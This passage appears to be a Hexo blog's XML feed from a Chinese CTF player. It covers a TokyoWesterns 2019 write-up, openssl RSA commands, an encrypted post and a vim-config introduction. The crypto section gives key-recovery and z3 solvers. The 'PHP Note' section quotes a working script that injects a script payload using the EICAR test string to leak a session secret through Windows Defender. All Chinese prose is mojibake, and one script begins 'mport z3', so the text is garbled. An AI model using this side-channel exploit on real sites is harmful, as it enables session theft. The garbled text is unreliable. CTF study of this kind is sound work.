class="number">-1</span>)*(q<span class="number">-1</span>)*(r<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(enc, d, n)</span><br><span class="line"><span class="keyword">print</span> number.long_to_bytes(m)</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>TokyoWestern2019</title>
    <url>/2019/09/04/TokyoWestern2019/</url>
    <content><![CDATA[<h1>Crypto</h1>
<h2 id="simple-logic">simple logic</h2>
<p>é¢˜ç›®ç»™å‡ºäº†åŠ å¯†è„šæœ¬</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"></span><br><span class="line">ROUNDS = <span class="number">765</span></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line">PAIRS = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(msg, key)</span></span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    ROUNDS.times <span class="keyword">do</span></span><br><span class="line">        enc = (enc + key) &amp; mask</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    enc</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(msg, key)</span></span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    ROUNDS.times <span class="keyword">do</span></span><br><span class="line">        enc = enc ^ key</span><br><span class="line">        enc = (enc - key) &amp; mask</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    enc</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">fail <span class="keyword">unless</span> BITS % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag = SecureRandom.bytes(BITS / <span class="number">8</span>).unpack1(<span class="string">'H*'</span>).to_i(<span class="number">16</span>)</span><br><span class="line">key = SecureRandom.bytes(BITS / <span class="number">8</span>).unpack1(<span class="string">'H*'</span>).to_i(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">STDERR.puts <span class="string">"The flag: TWCTF&#123;%x&#125;"</span> % flag</span><br><span class="line">STDERR.puts <span class="string">"Key=%x"</span> % key</span><br><span class="line">STDOUT.puts <span class="string">"Encrypted flag: %x"</span> % encrypt(flag, key)</span><br><span class="line">fail <span class="keyword">unless</span> decrypt(encrypt(flag, key), key) == flag <span class="comment"># Decryption Check</span></span><br><span class="line"></span><br><span class="line">PAIRS.times <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    plain = SecureRandom.bytes(BITS / <span class="number">8</span>).unpack1(<span class="string">'H*'</span>).to_i(<span class="number">16</span>)</span><br><span class="line">    enc = encrypt(plain, key)</span><br><span class="line">    STDOUT.puts <span class="string">"Pair %d: plain=%x enc=%x"</span> % [-~i, plain, enc]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>éšåç»™å‡ºäº†åŠ å¯†è¿‡åçš„flagä»¥åŠéšæœºäº§ç”Ÿçš„å…­ç»„æ˜æ–‡å’Œå¯¹åº”çš„å…­ç»„å¯†æ–‡.</p>
<p>åŠ å¯†è¿‡ç¨‹å°±æ˜¯æ˜æ–‡å’Œkeyç›¸åŠ ä¹‹ååœ¨å’Œkeyè¿›è¡Œä¸€æ¬¡å¼‚æˆ–, è¿™ä¸ªè¿‡ç¨‹é‡å¤765æ¬¡. å¾ˆæ˜æ˜¾æˆ‘ä»¬è¦æ±‚keyæ¥è§£å‡ºflag</p>
<p>åŸç†å¾ˆç®€å•:åœ¨è¿™ä¸ªåŠ å¯†è¿‡ç¨‹ä¸­, ä½ä½ä¼šå½±å“é«˜ä½çš„åŠ å¯†(æ¯”å¦‚æ˜æ–‡çš„ä½ä½å’Œkeyçš„ä½ä½ç›¸åŠ ä¹‹åä¼šå‘é«˜ä½è¿›è¡Œè¿›ä½) ä½†æ˜¯ä¸ä¼šå½±å“ä½ä½æœ¬èº«çš„åŠ å¯†, åŒæ—¶é«˜ä½ä¹Ÿä¸ä¼šå½±å“åˆ°ä½ä½çš„åŠ å¯†, å› æ­¤åªè¦ä»ä½ä½å¼€å§‹ä¸€ä½ä¸€ä½çˆ†ç ´å°±å¯ä»¥äº†. è¦æ±‚å·²çŸ¥keyçš„éƒ¨åˆ†å’Œæ¯ä¸€ç»„æ˜æ–‡ä¸­å¯¹åº”çš„é‚£ä¸€éƒ¨åˆ†ç»è¿‡756è½®åŠ å¯†ä¹‹åå’Œå¯†æ–‡å¯¹åº”éƒ¨åˆ†ä¸€è‡´.</p>
<p>æ¯”å¦‚</p>
<blockquote>
<p>çŒœæµ‹keyçš„æœ€åä¸€ä½æ˜¯1, å’Œå…­ç»„æ˜æ–‡ä¸­æ¯ä¸€ç»„çš„æœ€åä¸€ä½éƒ½åˆ†åˆ«åŠ å¯†756æ¬¡, æœ‰å…­ä¸ªå¯†æ–‡ä½, å¦‚æœå’Œé‚£å…­ç»„å¯†æ–‡çš„æœ€åä¸€ä½å¯¹åº”é‚£å°±å¯èƒ½æ˜¯keyçš„ä¸€éƒ¨åˆ†, ä¹‹æ‰€ä»¥è¯´å¯èƒ½æ˜¯å› ä¸ºåœ¨è€ƒè™‘ä½æ•°è¾ƒå°‘çš„æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨å¤šç§è§£çš„æƒ…å†µ.</p>
<p>çŒœæµ‹å€’æ•°ç¬¬äºŒä½ 01æˆ–è€…æ˜¯11 , è¿™ä¸¤ä¸ªå¯èƒ½éƒ½å»å’Œå…­ç»„æ˜æ–‡ä¸­æ¯ä¸€ç»„çš„æœ€åä¸¤ä½éƒ½åˆ†åˆ«åŠ å¯†756æ¬¡, æœ‰å…­ä¸ªå¯†æ–‡ä½, å¦‚æœå’Œé‚£å…­ç»„å¯†æ–‡çš„æœ€åä¸¤ä½å¯¹åº”é‚£å°±å¯èƒ½æ˜¯keyçš„ä¸€éƒ¨åˆ†.ç”±æ­¤ç±»æ¨â€¦</p>
</blockquote>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROUNDS = <span class="number">765</span></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(msg,key)</span>:</span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(ROUNDS):</span><br><span class="line">        enc = (enc + key) &amp; mask</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(msg, key)</span>:</span></span><br><span class="line">    enc = msg</span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; BITS) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(ROUNDS):</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">        enc = (enc - key) &amp; mask</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">the_flag = <span class="number">0x43713622de24d04b9c05395bb753d437</span></span><br><span class="line"></span><br><span class="line">plain = [<span class="number">0x29abc13947b5373b86a1dc1d423807a</span>,<span class="number">0xeeb83b72d3336a80a853bf9c61d6f254</span>,<span class="number">0x7a0e5ffc7208f978b81475201fbeb3a0</span>,<span class="number">0xc464714f5cdce458f32608f8b5e2002e</span>,<span class="number">0xf944aaccf6779a65e8ba74795da3c41d</span>,<span class="number">0x552682756304d662fa18e624b09b2ac5</span>]</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">0xb36b6b62a7e685bd1158744662c5d04a</span>,<span class="number">0x614d86b5b6653cdc8f33368c41e99254</span>,<span class="number">0x292a7ff7f12b4e21db00e593246be5a0</span>,<span class="number">0x64f930da37d494c634fa22a609342ffe</span>,<span class="number">0xaa3825e62d053fb0eb8e7e2621dabfe7</span>,<span class="number">0xf2ffdf4beb933681844c70190ecf60bf</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™è¾¹è¿™ä¸ªç®—æ³•å€¼å¾—å¥½å¥½ä½“ä¼š, ä»ä¸€ä½å¼€å§‹å‘æ›´å¤šçš„ä½æ•°è¿›è¡Œæ‰©å±•, ä¸€å¼€å§‹çš„0,1æ˜¯å¯¹æœ€ä½ä½çš„çŒœæµ‹</span></span><br><span class="line"><span class="comment"># å¤šè§£çš„æƒ…å†µä¼šå‡ºç°æ¯”å¦‚10,00,11,01éƒ½ç¬¦åˆæƒ…å†µ</span></span><br><span class="line">q = [<span class="string">'0'</span>,<span class="string">'1'</span>]</span><br><span class="line"><span class="keyword">while</span> len(q) != <span class="number">0</span>:</span><br><span class="line">    key = q.pop(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># é€šè¿‡flagä½æ¥æŒ‡ç¤ºæ“ä½œ</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="comment"># å¦‚æœè¿™ä¸ªkeyå°†å…­ç»„å¯†æ–‡è§£å¯†åçš„ç»“æœä¸æ˜æ–‡éƒ½ç›¸åŒ, å¾ªç¯ç»“æŸå¾—åˆ°äº†key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> decrypt(int(enc[i]),int(key,<span class="number">2</span>)) != int(plain[i]):</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> key</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">	<span class="comment"># åˆ¤æ–­é«˜ä¸€ä½ä¸º0æ˜¯å¦ç¬¦åˆæ¡ä»¶, æ³¨æ„è¿™è¾¹rjust(128).replace(' ','0')æ˜¯ä¸ºäº†å°†æ‰€æœ‰ç»“æœçš„é•¿åº¦ç»Ÿä¸€åˆ°æœ€é•¿, å¦åˆ™-1-len(key)å¯èƒ½ä¼šè¶…å‡ºèŒƒå›´</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> bin(decrypt(int(enc[i]),int(<span class="string">'0'</span>+key,<span class="number">2</span>)))[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):] != bin(plain[i])[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        q.append(<span class="string">'0'</span>+key)</span><br><span class="line"><span class="comment"># åˆ¤æ–­é«˜ä¸€ä½ä¸º1æ˜¯å¦ç¬¦åˆæ¡ä»¶, æ³¨æ„è¿™è¾¹rjust(128).replace(' ','0')æ˜¯ä¸ºäº†å°†æ‰€æœ‰ç»“æœçš„é•¿åº¦ç»Ÿä¸€åˆ°æœ€é•¿, å¦åˆ™-1-len(key)å¯èƒ½ä¼šè¶…å‡ºèŒƒå›´</span></span><br><span class="line">    flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> bin(decrypt(int(enc[i]),int(<span class="string">'1'</span>+key,<span class="number">2</span>)))[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):] != bin(plain[i])[<span class="number">2</span>:].rjust(<span class="number">128</span>).replace(<span class="string">' '</span>,<span class="string">'0'</span>)[<span class="number">-1</span>-len(key):]:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        q.append(<span class="string">'1'</span>+key)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># è§£å¯†flag</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"TWCTF&#123;"</span> + str(hex(decrypt(the_flag,int(key,<span class="number">2</span>)))[<span class="number">2</span>:<span class="number">-1</span>]) + <span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure>
<p>å› ä¸ºæ˜¯çº¿æ€§æ–¹ç¨‹ç»„,æ‰€ä»¥è¿˜æœ‰ä½¿ç”¨z3çš„è§£æ³•:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mport z3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">128</span></span><br><span class="line">ROUNDS = <span class="number">765</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(msg, key)</span>:</span></span><br><span class="line">    enc = msg</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(ROUNDS):</span><br><span class="line">        enc = (enc + key)</span><br><span class="line">        enc = enc ^ key</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">plain1= <span class="number">0x029abc13947b5373b86a1dc1d423807a</span></span><br><span class="line">enc1  = <span class="number">0xb36b6b62a7e685bd1158744662c5d04a</span></span><br><span class="line">plain2= <span class="number">0xeeb83b72d3336a80a853bf9c61d6f254</span></span><br><span class="line">enc2  = <span class="number">0x614d86b5b6653cdc8f33368c41e99254</span></span><br><span class="line">plain3= <span class="number">0x7a0e5ffc7208f978b81475201fbeb3a0</span></span><br><span class="line">enc3  = <span class="number">0x292a7ff7f12b4e21db00e593246be5a0</span></span><br><span class="line">plain4= <span class="number">0xc464714f5cdce458f32608f8b5e2002e</span></span><br><span class="line">enc4  = <span class="number">0x64f930da37d494c634fa22a609342ffe</span></span><br><span class="line">plain5= <span class="number">0xf944aaccf6779a65e8ba74795da3c41d</span></span><br><span class="line">enc5  = <span class="number">0xaa3825e62d053fb0eb8e7e2621dabfe7</span></span><br><span class="line">plain6= <span class="number">0x552682756304d662fa18e624b09b2ac5</span></span><br><span class="line">enc6  = <span class="number">0xf2ffdf4beb933681844c70190ecf60bf</span></span><br><span class="line"></span><br><span class="line">k = z3.BitVec(<span class="string">"k"</span>, <span class="number">128</span>)</span><br><span class="line">s = z3.Solver()</span><br><span class="line">s.add(encrypt(plain1, k) == enc1)</span><br><span class="line">s.add(encrypt(plain2, k) == enc2)</span><br><span class="line">s.add(encrypt(plain3, k) == enc3)</span><br><span class="line">s.add(encrypt(plain4, k) == enc4)</span><br><span class="line">s.add(encrypt(plain5, k) == enc5)</span><br><span class="line">s.add(encrypt(plain6, k) == enc6)</span><br><span class="line">print(s.check())</span><br><span class="line"><span class="keyword">if</span> s.check() == z3.sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    print(m)</span><br></pre></td></tr></table></figure>
<p>ç„¶åä½¿ç”¨keyè§£å¯†å³å¯</p>
<h1>web</h1>
<h2 id="PHP-Note">PHP Note</h2>
<p>è€ƒå¯Ÿwindowsæµ‹ä¿¡é“æ”»å‡»</p>
<p><a href="http://www.rai4over.cn/2019/09/10/TokyoWesterns-CTF-2019-PHP-Note-WriteUp/" target="_blank" rel="noopener">http://www.rai4over.cn/2019/09/10/TokyoWesterns-CTF-2019-PHP-Note-WriteUp/</a></p>
<p>é¢˜ç›®æ ‡å¿—:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server: Microsoft-IIS/10.0</span><br></pre></td></tr></table></figure>
<p>å¯æ˜¯ä¸ºä»€ä¹ˆæˆ‘çš„windows defender æ‹¦æˆªä¸åˆ°å‘¢â€¦</p>
<p>æ‘˜å½•ä¸€ä¸‹è„šæœ¬, ä»¥åå¯èƒ½ç”¨å¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">"http://phpnote.chal.ctf.westerns.tokyo/"</span></span><br><span class="line">    session = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">64</span>):</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            data = &#123;<span class="string">"realname"</span>: <span class="string">"xxxxxxxxxxxx"</span>&#125;</span><br><span class="line">            s.post(url + <span class="string">"/?action=login"</span>, data=data)</span><br><span class="line">            payload = <span class="string">'''&lt;script&gt;</span></span><br><span class="line"><span class="string">            var body = document.body.innerHTML;</span></span><br><span class="line"><span class="string">            var a = &#123;1: ''&#125;;</span></span><br><span class="line"><span class="string">            var x = a[Number(body.charCodeAt('''</span> + str(index) + <span class="string">''') == '''</span> + str(x) + <span class="string">''')];</span></span><br><span class="line"><span class="string">            var mal = "X5O!P%@AP[4\\\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*" + x;</span></span><br><span class="line"><span class="string">            eval(mal);</span></span><br><span class="line"><span class="string">&lt;/script&gt;&lt;body&gt;'''</span></span><br><span class="line">            print(payload)</span><br><span class="line">            data = &#123;<span class="string">"realname"</span>: payload, <span class="string">'nickname'</span>: <span class="string">'&lt;/body&gt;'</span>&#125;</span><br><span class="line">            s.post(url + <span class="string">"/?action=login"</span>, data=data)</span><br><span class="line">            rs = s.get(url + <span class="string">"/?action=index"</span>)</span><br><span class="line">            print(str(index) + <span class="string">'   '</span> + str(x))</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">'Login'</span> <span class="keyword">in</span> rs.text):</span><br><span class="line">                session = session + chr(x)</span><br><span class="line">                print(<span class="string">"session : "</span> + session)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>ä¿ç ”æ”¿ç­–è§£è¯»å°è®°[working]</title>
    <url>/2019/09/04/%E4%BF%9D%E7%A0%94%E6%94%BF%E7%AD%96%E8%A7%A3%E8%AF%BB%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="a8d13e815c076af49530150dbbe7e7154aa1fba6a647db488cecbb8614247e42">05d1735931d2533147897dc2f8b22b8dbf5884c5e02c152de5c17e36a6c49f21b401b4df3f3052ab8bc64dc6c4252e3d1f133e1c42cb2efce94864402db3303d9a1db62e7972fc3c6b4f3e2227dfbe36b520a4dc49fd460116d016e73bbafa42c489eb7467de087b9663531762d890a688dfa3acc58e2080f91561d4d49136823e5941c39149c5eeb94f8b4a4459b110ba59a4af7ec774316928e66ec8d1c665cb28024dbd0e2051d515498bc1757ea7c469f5450cca961758553eb504826312a7fcc6ca0158b15b18f6e71a5150c6f13b5ec4723aea4a5bc929ce1e9d0739111e64b6e8ca8f48612e34fd41c1d5199a991cc9bfc6f719c6d7bb326aa179339ebdbaa5143e9b574c955e431894fb2a1edd40ee12d10bc1f5913cd8b2432f869a42d0edf999dd039d8e2f910768b4806445a5d6743243c51994596988905b5f95eebccfd5721ef5b68df993e560b00a062db9e6db00b8d3ff7ee44caabff734681a904737d85427ac77947b24cd9fdc18fd3e53b30947b56c275b3960a88e0352f884b97dffb59c9d5e1def66c5b8baea170c99f8f6580b787655cc3f46ab49ace42826c8792244a3246f1bacc7234ee865d1fef829656ffcd2f9e2f5e9dac8d2a37ffc4c77783a918cda29162bfbf170127000068dfee7ce641283f2b2bfa1801bcdb8fed84a061600f24d0cdbe2e483b7c96e200e67d2b711795ba020e753c090b19951189701d8d6b078221ed4ebeadee085356cea36d9b1d21d5db86b9ca511f2834fb821ee71013857c5700f1ae6c200a1d94f88fb1dcc02edb07b398f16bbe2834e52f206c128847de68c8e886d883cd123b5357889a277e3e65445363509542493189736118b1b3fab9c090909c6a1aa03298f7413b9b9f849a6ee740af3a73759316e4e554962232c086f338e6f903bfe40771d351e7d4af3519c5059e5b2a6a3a4ef53a5971fb3c7d344c50d78db20d25ea20f50ad9cb2e7334f742b11882d33e3113c1d0e219377d1502029e9b1cd77855beb2bd95a8c087b91890b98db8605ebda4baa3c81c66429fbeca335035d0f1678459eb80421adb92119fc2126d7fb4dfdeb7c5d6b4a841676c06d65c20d22e44e092c74a6e3af5e56be9a455c6877a3470640629890c935ab3b993b3fde9e094df8831f3c9a1c1ff27ef83bf2ce824a749a8ab57cd3e1ed396b67185ec1fcbe3949a912bc6ff27ef481bf941c41462f931282b92b4d23a7f919d8c0c10ad4e8653e9d967586cd2823c0657bd2694aafe2fc140ffc2417a70d19127ff6404e743d3a6eb965c25dc99ddd95bf6efd940202883296b567c208278a5f1fc5060212efb689aed536e63e1795b0b99589e60e33d0065c08f6ec23f98596be8ed7e80f46fb63fe6f83fe0a098ecc458bcccba70473961d484d6d9fc11a957f9c128318d1d32ebe74609d4e2e95203f17ea8a8e83d119af7caadb220193f8316a0971412e525d7920a3cb38f2daa6819c1649e5e8c1f27ed664e593385152a7e3b457f4df407730187b9ad1002bd32fb537252fd949c2a212208d4b51ed62b3b80d64e45f196a118d9cd22e198bd998e587bda74026660d329d1a1b7930db656f1ec7064c438bc48e42e507019a7f484ede3fd36777873b30a7d9406975ab17a7ed25ae121d715c25e7a7f01b96eb1943cf3d2d594c0c92c96894aa9e097f176b3982bead8e71c379e5c2bb15668f0bb89ac640aae3e0cbbf40686ed81ad873296f6aeb0ae0fad5d88b666be4589c2297cd4e0d118b8dba5292749aad800df290c4955a631c84672edad4f496af5b817dba448c5294670336f791514e3750171f45741379314adae5b4ac568f6e1eaadfc02268208f6cf88737519193950391cd80978cb91f3c65977dc05ae902791aa9e05b03fa371e35f94db1c20e7c76479c136c8947787fd1e945d1ac2b75fc679722ce21c69f39296eecca2b44c91c7ce6a38f0040827616153ce0869f956886bbd1bb4f38eac92b51535363a77d9e7ce4bc75e9aae52bdbc72d9abfa4930d93d7fa2f19ab9fde7244e6b23685aaa5ada2516abbb29fcb6c1cd4a6cca67094df184ac14fba87c02d291a51e3dec88ba528471c0dbab01b633b23a1574a755e62209e001ab3be0c772e2a0220ae2e75fcdf7daafa9929382a91e3cad73a464948d89a131e1e87ac56e83c98871fba3bf1c2d66a01a62ac623268bb7d71bb38f906ca1349df622e0ca12f63f14f5f7090c680f90a75ce39b68fae70ad7852a6faba9e529a4dd31050381e8b01327f9cb119dbde0088a7be87d0ad62220b88582ad72c0e578f2b92e49e7d2b1023abc5fc46ac86b99af4afb7e5d89097f937dba031563ac786f8a86604418208ea326449e613dbae70d5d9f320a0037a3fb54294b86c8f14e653e0320a5510ee8142b252b708d37ed73fb82e9fa49f137c5fa37876ebafb31348c11e51d32bf7f78675638e78b03074ace7d6de7bd148d3488d9ae5ddc215f2ea0538c909b22f5c49f06df77f031d6033c96e4e3e2c08fbfdce88ef3a29e3349128ebeecc762af5d0fef46058d120852828dea2b0f8a941e83ce536a27389d2cec166694333af5c3cf747fe85757f08064923aaaeadf3d3b2056</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>opensslç¬”è®°</title>
    <url>/2019/09/01/openssl%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æå–">ä¿¡æ¯æå–</h2>
<p>ç”Ÿæˆä¸€ä¸ªåŒ…å«å¯†é’¥å’Œå…¬é’¥çš„æ–‡ä»¶,æ—¢å¯ä»¥ç”¨æ¥åŠ å¯†ä¹Ÿå¯ä»¥ç”¨æ¥è§£å¯†.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out target.key 1024</span><br></pre></td></tr></table></figure>
<p>ä»è¿™ä¸ªåŒ…å«å…¬é’¥å’Œç§é’¥çš„æ–‡ä»¶ä¸­æå–å‡ºå…¬é’¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsa -in target.key -pubout -out target_pub.key</span><br></pre></td></tr></table></figure>
<p>ä»å…¬é’¥ä¸­æå–rsaå…¬é’¥ä¿¡æ¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -in (filename) -text</span><br></pre></td></tr></table></figure>
<p>æå–å…¶ä¸­æ¨¡æ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -in (filename) -text -modulus</span><br></pre></td></tr></table></figure>
<h2 id="åŠ å¯†è§£å¯†">åŠ å¯†è§£å¯†</h2>
<p>å…¬é’¥åŠ å¯†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsautl -encrypt -in target -out target.enc -inkey target_pub.pem -pubin</span><br></pre></td></tr></table></figure>
<p>ç§é’¥è§£å¯†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in target.enc -out target -inkey target_pri.pem</span><br></pre></td></tr></table></figure>
<p>ç”¨ä¸‰ç§å¡«å……æ–¹å¼è§£å¯†,(ç¬¬ä¸€ç§æ²¡æœ‰å¡«å……)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.dec</span><br><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.key -out flag.dec -oaep</span><br><span class="line">openssl rsautl -decrypt -in flag.enc-inkey private.key -out flag.dec -pkcs</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>ch4ser çš„ vim</title>
    <url>/2019/04/22/ch4ser%E2%80%98s%20vim/</url>
    <content><![CDATA[<h1>ch4ser çš„ vim</h1>
<blockquote>
<p>å‰è¨€:æ²¡æœ‰æ¯”æŠŠæ—¶é—´èŠ±åœ¨é…ç½®ä¸Šæ›´å‚»é€¼çš„äº‹æƒ…äº†.</p>
</blockquote>
<p>ã€Šç¨‹åºå‘˜ä¿®ç‚¼ä¹‹é“ã€‹ä¸­æœ‰ä¸€å¥è¯:<code>æœ€å¥½æ˜¯ç²¾é€šä¸€ç§ç¼–è¾‘å™¨ï¼Œå¹¶å°†å…¶ç”¨äºæ‰€æœ‰ç¼–è¾‘ä»»åŠ¡ã€‚å¦‚æœä¸åšæŒä½¿ç”¨ä¸€ç§ç¼–è¾‘å™¨ï¼Œå¯èƒ½ä¼šé¢ä¸´ç°ä»£çš„å·´åˆ«ç‰¹å¤§æ··ä¹±ã€‚</code> ï¼Œå®è´¨ä»Šæ—¥ï¼Œæ·±ä»¥ä¸ºç„¶ã€‚è€Œè‡ªä»æ¥è§¦vimä¹‹åæˆ‘ä¸€ç›´éƒ½ä¿æŒç€æœ‰ç©ºæŠ˜è…¾æŠ˜è…¾çš„å¥½ä¹ æƒ¯ï¼Œå®ƒçš„ç®€æ´å’Œé«˜åº¦è‡ªç”±è®©äººç€è¿·ï¼Œå›´ç»•ç€vimè¡ç”Ÿå‡ºçš„æ’ä»¶æ•°ä¸èƒœæ•°ã€‚å¥ˆä½•æ’ä»¶ç¹å¤šçš„åŒæ—¶ä¹Ÿæ„å‘³ç€é€‰æ‹©çš„å›°éš¾å’Œé…ç½®çš„ç¹çã€‚ä¸ºäº†å‡†å¤‡ä»¥åå¯èƒ½å‡ºç°çš„çªå‘æƒ…å†µæ¯”å¦‚é…ç½®ä¸¢å¤±æˆ–è€…é‡æ–°å®‰è£…ï¼Œç‰¹åœ¨æ­¤ä»¥å®ç°ç‰¹å®šåŠŸèƒ½ä¸ºä¸»é¢˜ï¼Œè®°å½•è‡ªå·±é…ç½®vimçš„è¿‡ç¨‹ã€‚</p>
<hr>
<p>ç›¸æ¯”è¾ƒvim, neovimçš„é€Ÿåº¦æ›´å¿«.</p>
<p>ä¸ºäº†è°ƒåŠ¨é£Ÿæ¬²,å…ˆä¸Šæ•ˆæœå›¾:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61574401-c9250e80-aaf1-11e9-9e2b-0350e5f43c62.png" alt="image"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/61574421-13a68b00-aaf2-11e9-9ab1-57b763f13f52.png" alt="image"></p>
<p>vimä¸‹æ‰“å¼€ç»ˆç«¯</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61574428-405aa280-aaf2-11e9-9045-422e38dd6e11.png" alt="image"></p>
